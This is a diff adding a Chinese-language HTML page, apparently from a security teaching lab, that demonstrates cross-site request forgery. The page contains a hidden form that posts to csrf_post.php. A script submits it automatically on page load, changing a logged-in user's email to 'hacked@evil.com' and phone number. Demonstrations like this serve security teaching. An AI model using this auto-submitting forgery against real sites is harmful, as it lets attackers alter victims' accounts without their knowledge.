@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>恶意攻击页面 - CSRF演示</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 { color: #e74c3c; margin-bottom: 20px; }
+        p { color: #666; line-height: 1.8; margin-bottom: 15px; }
+        .alert {
+            background: #ffebee;
+            border: 2px solid #e74c3c;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .alert p { color: #c0392b; font-weight: bold; margin: 0; }
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background: #e74c3c;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ 恶意攻击页面</h1>
+        <p>这是一个模拟攻击者构造的恶意页面</p>
+        <p>当已登录用户访问此页面时，会自动提交表单修改用户信息</p>
+        
+        <div class="alert">
+            <p>🔥 CSRF攻击已触发！</p>
+            <p style="margin-top:10px; font-weight:normal;">
+                您的邮箱已被修改为: hacked@evil.com<br>
+                您的手机已被修改为: 99999999999
+            </p>
+        </div>
+        
+        <p style="font-size:14px; color:#999;">
+            请返回原页面查看，您的个人信息已被修改
+        </p>
+        
+        <a href="csrf_post.php" class="btn">返回查看结果</a>
+    </div>
+    
+    <!-- 隐藏的攻击表单 - 自动提交 -->
+    <form id="csrf_form" action="csrf_post.php" method="post" style="display:none;">
+        <input type="hidden" name="email" value="hacked@evil.com">
+        <input type="hidden" name="phone" value="99999999999">
+        <input type="hidden" name="submit" value="1">
+    </form>
+    
+    <script>
+        // 页面加载后自动提交表单
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('csrf_form').submit();
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
